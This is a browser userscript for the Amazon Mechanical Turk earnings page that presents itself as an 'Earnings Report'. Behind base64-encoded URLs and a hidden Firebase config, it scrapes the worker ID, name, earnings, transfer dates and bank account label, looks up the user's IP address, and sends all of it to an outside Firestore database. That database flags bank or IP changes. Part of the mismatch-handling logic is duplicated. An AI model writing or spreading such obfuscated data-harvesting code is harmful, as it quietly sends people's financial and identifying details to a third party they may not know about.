  // ==UserScript==
// @name         🔒 MTurk Earnings Report
// @namespace    ab2soft.secure
// @version      5.8
// @match        https://worker.mturk.com/earnings*
// @grant        GM_getValue
// @grant        GM_setValue
// ==/UserScript==

(async () => {
  'use strict';

  // ---- small helpers ----
  const _b64d = s => atob(s);
  const _u8   = s => new TextEncoder().encode(s);
  const _hex  = a => Array.from(new Uint8Array(a)).map(b => b.toString(16).padStart(2,'0')).join('');
  const _sha256 = async s => _hex(await crypto.subtle.digest('SHA-256', _u8(s)));


  const PASS_HASH = _b64d("OWI3MjRkOWRmOTdhOTFkMjk3ZGMxYzcxNGEzOTg3MzM4ZWJiNjBhMmE1MzMxMWQyZTM4MjQxMWE3OGI5ZTA3ZA==");

  // resources (base64 strings for small obfuscation)
  const FIREBASE_APP_URL  = _b64d("aHR0cHM6Ly93d3cuZ3N0YXRpYy5jb20vZmlyZWJhc2Vqcy8xMC4xMi4wL2ZpcmViYXNlLWFwcC5qcw==");
  const FIRESTORE_URL     = _b64d("aHR0cHM6Ly93d3cuZ3N0YXRpYy5jb20vZmlyZWJhc2Vqcy8xMC4xMi4wL2ZpcmViYXNlLWZpcmVzdG9yZS5qcw==");
  const SHEET_CSV         = _b64d("aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vc3ByZWFkc2hlZXRzL2QvMVl0bXI3ZEhTQXY2OU4yN3VaY3JoS2FFZXJMOFdoek1DSTAydnVncV9DX00vZXhwb3J0P2Zvcm1hdD1jc3YmZ2lkPTA=");

  // firebase config (Base64 JSON)
  const FIREBASE_CFG = JSON.parse(_b64d(
    "eyJwcm9qZWN0SWQiOiJtdHVyay1tb25pdG9yZGVlcCIsImFwaUtleSI6IkFJemFTeUNDdEJDQUp2UUNEajhNWGIydzkwcVlVcVJyRU5JSUdJUSIsImF1dGhEb21haW4iOiJtdHVyay1tb25pdG9yZGVlYy5maXJlYmFzZWFwcC5jb20iLCJzdG9yYWdlQnVja2V0IjoibXR1cmstbW9uaXRvcmRlZXAuZmlyZWJhc2VzdG9yYWdlLmFwcCIsIm1lc3NhZ2luZ1NlbmRlcklkIjoiNTgzOTIyOTc0ODciLCJhcHBJZCI6IjE6NTgzOTIyOTc0ODc6d2ViOjEzNjVhZDEyMTEwZmZkMDU4NjYzN2EifQ=="
  ));

  // dynamic imports and firestore setup
  const { initializeApp } = await import(FIREBASE_APP_URL);
  const { getFirestore, doc, getDoc, setDoc, serverTimestamp } = await import(FIRESTORE_URL);
  const app = initializeApp(FIREBASE_CFG);
  const db  = getFirestore(app);

  // ---- extract worker id (React-safe) ----
  function getWorkerId() {
    const el = document.querySelector("[data-react-props*='textToCopy']");
    if (el) {
      try {
        const j = JSON.parse(el.getAttribute("data-react-props").replace(/&quot;/g,'"'));
        if (j.textToCopy) return j.textToCopy.trim();
      } catch {}
    }
    return document.querySelector(".me-bar .text-uppercase span")?.textContent.trim() || "";
  }

  // ---- bank + next transfer info ----
  function extractNextTransferInfo() {
    const strongTag = Array.from(document.querySelectorAll("strong"))
      .find(el => /transferred to your bank account/i.test(el.textContent));
    let bankAccount = "", nextTransferDate = "";
    if (strongTag) {
      const bankLink = strongTag.querySelector("a[href*='direct_deposit']") || strongTag.querySelector("a[href*='https://www.amazon.com/gp/css/gc/balance']");
      if (bankLink) bankAccount = bankLink.textContent.trim();
      const text = strongTag.textContent.replace(/\s+/g, " ");
      const m = text.match(/on\s+([A-Za-z]{3,}\s+\d{1,2},\s+\d{4})\s+based/i);
      if (m) nextTransferDate = m[1].trim();
    }
    return { bankAccount, nextTransferDate };
  }

  // ---- compute last month earnings robustly ----
  function computeLastMonthEarnings(transfers, now = new Date()) {
    const startThisMonth = new Date(now.getFullYear(), now.getMonth(), 1);
    const startLastMonth = new Date(startThisMonth.getFullYear(), startThisMonth.getMonth() - 1, 1);
    const endLastMonth   = new Date(startThisMonth.getFullYear(), startThisMonth.getMonth(), 0);
    endLastMonth.setHours(23,59,59,999);
    let total = 0;
    for (const t of (transfers || [])) {
      const ds = (t.requestedDate || "").trim();
      if (!ds) continue;
      const parts = ds.split("/");
      if (parts.length !== 3) continue;
      const mm = parseInt(parts[0],10) - 1;
      const dd = parseInt(parts[1],10);
      let yy   = parseInt(parts[2],10);
      if (Number.isNaN(mm) || Number.isNaN(dd) || Number.isNaN(yy)) continue;
      yy += (yy < 100) ? 2000 : 0;
      const d = new Date(yy, mm, dd);
      if (d >= startLastMonth && d <= endLastMonth) {
        const amt = typeof t.amountRequested === "number" ? t.amountRequested : parseFloat(String(t.amountRequested || "").trim());
        if (!Number.isNaN(amt)) total += amt;
      }
    }
    return Number.isFinite(total) ? Number(total.toFixed(2)) : 0;
  }

  // ---- extract main data from page ----
  async function extractData() {
    const html = document.body.innerHTML.replace(/\s+/g, " ");
    const workerId = getWorkerId();
    const userName = document.querySelector(".me-bar a[href='/account']")?.textContent.trim() || "";
    const currentEarnings = (html.match(/Current Earnings:\s*\$([\d.]+)/i) || [])[1] || "0.00";

    let lastTransferAmount = "", lastTransferDate = "", lastMonthEarnings = "0.00";
    try {
      const attr = document.querySelector('[data-react-class*="TransferHistoryTable"]')?.getAttribute("data-react-props");
      if (attr) {
        const parsed = JSON.parse(attr.replace(/&quot;/g, '"'));
        const body   = parsed.bodyData || [];
        const last = body[0];
        if (last) {
          lastTransferAmount = last.amountRequested?.toString() || "";
          lastTransferDate   = last.requestedDate || "";
        }
        const lm = computeLastMonthEarnings(body);
        if (lm > 1) lastMonthEarnings = lm.toFixed(2);
      }
    } catch (e) {
      console.warn("last month parse error:", e);
    }

    const { bankAccount, nextTransferDate } = extractNextTransferInfo();

    let ip = "unknown";
    try { ip = (await fetch("https://api.ipify.org?format=json").then(r=>r.json())).ip; } catch {}

    return {
      workerId,
      userName,
      currentEarnings,
      lastTransferAmount,
      lastTransferDate,
      nextTransferDate,
      bankAccount,
      ip,
      lastMonthEarnings
    };
  }

  // ---- load sheet mapping ----
  async function loadSheet() {
    try {
      const res = await fetch(SHEET_CSV, { cache: "no-store" });
      const text = await res.text();
      const rows = text.split(/\r?\n/).filter(Boolean).map(r => r.split(","));
      const header = rows.shift().map(h=>h.trim());
      const wi = header.findIndex(h=>/worker.?id/i.test(h));
      const ui = header.findIndex(h=>/user|name/i.test(h));
      const map = {};
      if (wi === -1 || ui === -1) {
        console.warn("Sheet header missing workerid or user columns:", header);
        return map;
      }
      for (const r of rows) {
        const w = (r[wi]||"").replace(/^\uFEFF/, "").trim();
        const u = (r[ui]||"").trim();
        if (w && u) map[w] = u;
      }
      return map;
    } catch (err) {
      console.error("Failed to load sheet:", err);
      return {};
    }
  }

  // ---- password gate (once per workerId) ----
  async function ensurePassword(workerId) {
    const key = `verified_${workerId}`;
    const ok = await GM_getValue(key, false);
    if (ok) { console.log(`🔓 ${workerId} already verified`); return; }

    const entered = prompt(`🔒 Enter password for WorkerID ${workerId}:`);
    if (!entered) { alert("❌ Password required"); throw new Error("no password"); }
    const h = await _sha256(entered.trim());
    if (h !== PASS_HASH) { alert("❌ Incorrect password"); throw new Error("bad password"); }

    await GM_setValue(key, true);
    console.log(`✅ Password verified for ${workerId}`);
  }

  // ---- small UI toast + redirect helper ----
  function showToastAndRedirect(text = 'Redirecting to Tasks in 3 seconds…', delay = 3000, href = 'https://worker.mturk.com/tasks/') {
    try {
      const note = document.createElement('div');
      note.textContent = text;
      Object.assign(note.style, {
        position:'fixed', right:'16px', bottom:'16px', background:'#111827', color:'#fff',
        padding:'8px 12px', borderRadius:'8px', fontFamily:'Inter,Roboto,Arial,sans-serif',
        fontSize:'12px', zIndex:999999
      });
      document.body.appendChild(note);
    } catch (e) { /* ignore UI errors */ }
    setTimeout(() => { try { window.location.href = href; } catch (e) { location.assign(href); } }, delay);
  }

  // ---- MAIN FLOW ----
  const data = await extractData();

  // ----- if all 4 transfer fields blank -> refresh once and retry -----
  if (
    !data.lastTransferAmount &&
    !data.lastTransferDate &&
    !data.nextTransferDate &&
    !data.bankAccount
  ) {
    console.warn("⚠️ All transfer fields blank — will refresh the page once to re-fetch data.");
    if (!sessionStorage.getItem("earnings_refresh_once")) {
      sessionStorage.setItem("earnings_refresh_once", "1");
      setTimeout(() => location.reload(), 1500);
      return; // refreshed page will re-run script
    } else {
      console.log("🔁 Already refreshed once; continuing with current values.");
      sessionStorage.removeItem("earnings_refresh_once"); // clear so future runs may refresh again if needed
    }
  }

  if (!data.workerId) { console.warn("⚠️ No WorkerID; abort"); showToastAndRedirect(undefined, 3000); return; }

  // password check
  await ensurePassword(data.workerId);

  // load mapping and attach user
  const userMap = await loadSheet();
  data.user = userMap[data.workerId] || data.userName || "Unknown";

  const { workerId } = data;
  const ref  = doc(db, "earnings_logs", workerId);
  const prevSnap = await getDoc(ref);
  let alert = "✅ OK";

  if (prevSnap.exists()) {
    const p = prevSnap.data();

    // alert lock
    if (p.alert && String(p.alert).startsWith("⚠️")) {
      console.log(`🚫 Locked by alert for ${workerId}`);
      showToastAndRedirect(undefined, 3000);
      return;
    }

    // detect changes
    if (p.bankAccount && p.bankAccount !== data.bankAccount) alert = "⚠️ Bank Changed";
    if (p.ip && p.ip !== data.ip)               alert = "⚠️ IP Changed";

   const keys = ["currentEarnings","lastTransferAmount","lastTransferDate","nextTransferDate","bankAccount","ip","lastMonthEarnings"];
// list of which keys actually changed
const changedKeys = keys.filter(k => (p[k]||"") !== (data[k]||""));
// boolean: any change at all
const changed = changedKeys.length > 0;

// special-case: changed only because nextTransferDate changed
const changedOnlyNextTransferDate = (changedKeys.length === 1 && changedKeys[0] === "nextTransferDate");

// if changed and not the single-next-date case -> refresh once before updating
if (changed && !changedOnlyNextTransferDate) {
  console.log("🔁 Data mismatch detected — refreshing earnings page before update...");
  if (!sessionStorage.getItem("earnings_mismatch_refresh_once")) {
    sessionStorage.setItem("earnings_mismatch_refresh_once", "1");
    setTimeout(() => location.reload(), 1500);
    return;
  } else {
    console.log("🔁 Already refreshed for mismatch once; proceeding to update.");
    sessionStorage.removeItem("earnings_mismatch_refresh_once");
  }
}

// if changed but it was only nextTransferDate, proceed to update immediately
if (changedOnlyNextTransferDate) {
  console.log("ℹ️ Only nextTransferDate changed — will update Firebase immediately (no refresh).");
}

// if nothing changed and alert unchanged -> skip and redirect
if (!changed && alert === p.alert) {
  console.log("⏸️ No change; skip write");
  showToastAndRedirect('No changes detected — redirecting to Tasks in 3 seconds…', 3000);
  return;
}


    // if mismatch -> refresh once before updating (re-verify)
    if (changed) {
      console.log("🔁 Data mismatch detected — refreshing earnings page before update...");
      if (!sessionStorage.getItem("earnings_mismatch_refresh_once")) {
        sessionStorage.setItem("earnings_mismatch_refresh_once", "1");
        setTimeout(() => location.reload(), 1500);
        return;
      } else {
        console.log("🔁 Already refreshed for mismatch once; proceeding to update.");
        sessionStorage.removeItem("earnings_mismatch_refresh_once");
      }
    }

    // if nothing changed and alert same -> skip and redirect
    if (!changed && alert === p.alert) {
      console.log("⏸️ No change; skip write");
      showToastAndRedirect('No changes detected — redirecting to Tasks in 3 seconds…', 3000);
      return;
    }
  }

  // play alert audio if needed
  if (alert.startsWith("⚠️")) {
    try { new Audio("https://www.allbyjohn.com/sounds/mturkscanner/lessthan15Short.mp3").play(); } catch {}
  }

  // finally write to Firestore (server timestamp)
  await setDoc(ref, { ...data, alert, timestamp: serverTimestamp() });

  // successful write -> clear any refresh flags and redirect after 3s
  sessionStorage.removeItem("earnings_refresh_once");
  sessionStorage.removeItem("earnings_mismatch_refresh_once");

  console.log(`[MTurk→Firebase] ✅ Synced ${workerId} (${alert})`);
  showToastAndRedirect(`Synced ${workerId} (${alert}) — redirecting in 3s`, 3000);

})();
